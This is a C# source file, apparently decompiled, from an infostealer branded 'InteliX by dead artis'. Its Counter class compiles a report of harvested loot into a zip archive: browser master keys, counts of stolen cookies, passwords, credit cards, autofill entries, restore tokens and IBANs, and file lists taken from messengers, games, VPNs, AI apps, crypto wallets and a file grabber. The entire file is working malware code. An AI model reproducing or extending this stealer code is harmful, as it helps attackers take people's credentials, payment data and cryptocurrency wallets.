using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using Intelix.Helper.Encrypted;

namespace Intelix.Helper.Data
{
	// Token: 0x0200007C RID: 124
	public class Counter
	{
		// Token: 0x060001EE RID: 494 RVA: 0x0001850C File Offset: 0x0001670C
		public void Collect(InMemoryZip zip)
		{
			List<string> list = new List<string>();
			list.Add("    ____      __       _______  __");
			list.Add("   /  _/___  / /____  / /  _/ |/ /");
			list.Add("   / // __ \\/ __/ _ \\/ // / |   / ");
			list.Add(" _/ // / / / /_/  __/ // / /   |  ");
			list.Add("/___/_/ /_/\\__/\\___/_/___//_/|_|  ");
			list.Add("                                   ");
			list.Add("               InteliX by dead artis");
			list.Add("");
			List<string[]> masterKeys = LocalState.GetMasterKeys();
			bool flag = masterKeys.Count<string[]>() > 0;
			if (flag)
			{
				list.Add(string.Format("[Keys]  [--{0}--]  [{1}]", masterKeys.Count<string[]>(), string.Join(", ", (from k in masterKeys
				select Paths.GetBrowserName(k[0])).Distinct<string>())));
				foreach (string[] array in masterKeys)
				{
					list.Add(string.Concat(new string[]
					{
						"       [",
						Paths.GetBrowserName(array[0]),
						" ",
						array[1],
						"] ",
						array[2]
					}));
				}
				list.Add("");
			}
			bool flag2 = this.Browsers.Count<Counter.CounterBrowser>() > 0;
			if (flag2)
			{
				list.Add(string.Format("[Browsers]  [--{0}--]  [{1}]", this.Browsers.Count<Counter.CounterBrowser>(), string.Join(", ", (from b in this.Browsers
				select b.BrowserName).ToArray<string>())));
				foreach (Counter.CounterBrowser counterBrowser in this.Browsers)
				{
					list.Add("  - " + counterBrowser.Profile);
					bool flag3 = counterBrowser.Cookies != 0L;
					if (flag3)
					{
						list.Add(string.Format("       [Cookies {0}]", counterBrowser.Cookies));
					}
					bool flag4 = counterBrowser.Password != 0L;
					if (flag4)
					{
						list.Add(string.Format("       [Passwords {0}]", counterBrowser.Password));
					}
					bool flag5 = counterBrowser.CreditCards != 0L;
					if (flag5)
					{
						list.Add(string.Format("       [CreditCards {0}]", counterBrowser.CreditCards));
					}
					bool flag6 = counterBrowser.AutoFill != 0L;
					if (flag6)
					{
						list.Add(string.Format("       [AutoFill {0}]", counterBrowser.AutoFill));
					}
					bool flag7 = counterBrowser.RestoreToken != 0L;
					if (flag7)
					{
						list.Add(string.Format("       [RestoreToken {0}]", counterBrowser.RestoreToken));
					}
					bool flag8 = counterBrowser.MaskCreditCard != 0L;
					if (flag8)
					{
						list.Add(string.Format("       [MaskCreditCard {0}]", counterBrowser.MaskCreditCard));
					}
					bool flag9 = counterBrowser.MaskedIban != 0L;
					if (flag9)
					{
						list.Add(string.Format("       [MaskedIban {0}]", counterBrowser.MaskedIban));
					}
					list.Add("");
				}
				list.Add("");
			}
			bool flag10 = this.Applications.Count<Counter.CounterApplications>() > 0;
			if (flag10)
			{
				list.Add(string.Format("[Applications]  [--{0}--]  [{1}]", this.Applications.Count<Counter.CounterApplications>(), string.Join(", ", (from b in this.Applications
				select b.Name).ToArray<string>())));
				foreach (Counter.CounterApplications counterApplications in this.Applications)
				{
					list.Add("     [Name " + counterApplications.Name + "]");
					foreach (string str in counterApplications.Files.Reverse<string>())
					{
						list.Add("       - " + str);
					}
					list.Add("");
				}
				list.Add("");
			}
			bool flag11 = this.Games.Count<Counter.CounterApplications>() > 0;
			if (flag11)
			{
				list.Add(string.Format("[Games]  [--{0}--]  [{1}]", this.Games.Count<Counter.CounterApplications>(), string.Join(", ", (from b in this.Games
				select b.Name).ToArray<string>())));
				foreach (Counter.CounterApplications counterApplications2 in this.Games)
				{
					list.Add("     [Name " + counterApplications2.Name + "]");
					foreach (string str2 in counterApplications2.Files.Reverse<string>())
					{
						list.Add("       - " + str2);
					}
					list.Add("");
				}
				list.Add("");
			}
			bool flag12 = this.Messangers.Count<Counter.CounterApplications>() > 0;
			if (flag12)
			{
				list.Add(string.Format("[Messangers]  [--{0}--]  [{1}]", this.Messangers.Count<Counter.CounterApplications>(), string.Join(", ", (from b in this.Messangers
				select b.Name).ToArray<string>())));
				foreach (Counter.CounterApplications counterApplications3 in this.Messangers)
				{
					list.Add("     [Name " + counterApplications3.Name + "]");
					foreach (string str3 in counterApplications3.Files.Reverse<string>())
					{
						list.Add("       - " + str3);
					}
					list.Add("");
				}
				list.Add("");
			}
			bool flagAI = this.AI.Count<Counter.CounterApplications>() > 0;
			if (flagAI)
			{
				list.Add(string.Format("[AI]  [--{0}--]  [{1}]", this.AI.Count<Counter.CounterApplications>(), string.Join(", ", (from b in this.AI
				select b.Name).ToArray<string>())));
				foreach (Counter.CounterApplications counterAI in this.AI)
				{
					list.Add("     [Name " + counterAI.Name + "]");
					foreach (string strAI in counterAI.Files.Reverse<string>())
					{
						list.Add("       - " + strAI);
					}
					list.Add("");
				}
				list.Add("");
			}
			bool flag13 = this.Vpns.Count<Counter.CounterApplications>() > 0;
			if (flag13)
			{
				list.Add(string.Format("[Vpns]  [--{0}--]  [{1}]", this.Vpns.Count<Counter.CounterApplications>(), string.Join(", ", (from b in this.Vpns
				select b.Name).ToArray<string>())));
				foreach (Counter.CounterApplications counterApplications4 in this.Vpns)
				{
					list.Add("     [Name " + counterApplications4.Name + "]");
					foreach (string str4 in counterApplications4.Files.Reverse<string>())
					{
						list.Add("       - " + str4);
					}
					list.Add("");
				}
				list.Add("");
			}
			bool flag14 = this.CryptoChromium.Count<string>() > 0;
			if (flag14)
			{
				list.Add(string.Format("[CryptoChromium]  [--{0}--]", this.CryptoChromium.Count<string>()));
				foreach (string str5 in this.CryptoChromium)
				{
					list.Add("  - " + str5);
				}
				list.Add("");
			}
			bool flag15 = this.CryptoDesktop.Count<string>() > 0;
			if (flag15)
			{
				list.Add(string.Format("[CryptoDesktop]  [--{0}--]", this.CryptoDesktop.Count<string>()));
				foreach (string str6 in this.CryptoDesktop)
				{
					list.Add("  - " + str6);
				}
				list.Add("");
			}
			bool flag16 = this.FilesGrabber.Count<string>() > 0;
			if (flag16)
			{
				list.Add(string.Format("[FilesGrabber]  [--{0}--]", this.FilesGrabber.Count<string>()));
				foreach (string str7 in this.FilesGrabber)
				{
					list.Add("  - " + str7);
				}
				list.Add("");
			}
			zip.AddTextFile("IntelIX.txt", string.Join("\n", list));
		}

		// Token: 0x0400006B RID: 107
		public ConcurrentBag<string> FilesGrabber = new ConcurrentBag<string>();

		// Token: 0x0400006C RID: 108
		public ConcurrentBag<string> CryptoDesktop = new ConcurrentBag<string>();

		// Token: 0x0400006D RID: 109
		public ConcurrentBag<string> CryptoChromium = new ConcurrentBag<string>();

		// Token: 0x0400006E RID: 110
		public ConcurrentBag<Counter.CounterBrowser> Browsers = new ConcurrentBag<Counter.CounterBrowser>();

		// Token: 0x0400006F RID: 111
		public ConcurrentBag<Counter.CounterApplications> Applications = new ConcurrentBag<Counter.CounterApplications>();

		// Token: 0x04000070 RID: 112
		public ConcurrentBag<Counter.CounterApplications> Vpns = new ConcurrentBag<Counter.CounterApplications>();

		// Token: 0x04000071 RID: 113
		public ConcurrentBag<Counter.CounterApplications> Games = new ConcurrentBag<Counter.CounterApplications>();

		// Token: 0x04000072 RID: 114
		public ConcurrentBag<Counter.CounterApplications> Messangers = new ConcurrentBag<Counter.CounterApplications>();

		// Token: 0x04000073 RID: 115
		public ConcurrentBag<Counter.CounterApplications> AI = new ConcurrentBag<Counter.CounterApplications>();

		// Token: 0x020000FB RID: 251
		public class CounterBrowser
		{
			// Token: 0x04000228 RID: 552
			public string Profile;

			// Token: 0x04000229 RID: 553
			public string BrowserName;

			// Token: 0x0400022A RID: 554
			public ConcurrentLong Cookies;

			// Token: 0x0400022B RID: 555
			public ConcurrentLong Password;

			// Token: 0x0400022C RID: 556
			public ConcurrentLong CreditCards;

			// Token: 0x0400022D RID: 557
			public ConcurrentLong AutoFill;

			// Token: 0x0400022E RID: 558
			public ConcurrentLong RestoreToken;

			// Token: 0x0400022F RID: 559
			public ConcurrentLong MaskCreditCard;

			// Token: 0x04000230 RID: 560
			public ConcurrentLong MaskedIban;
		}

		// Token: 0x020000FC RID: 252
		public class CounterApplications
		{
			// Token: 0x04000231 RID: 561
			public string Name;

			// Token: 0x04000232 RID: 562
			public ConcurrentBag<string> Files = new ConcurrentBag<string>();
		}
	}
}
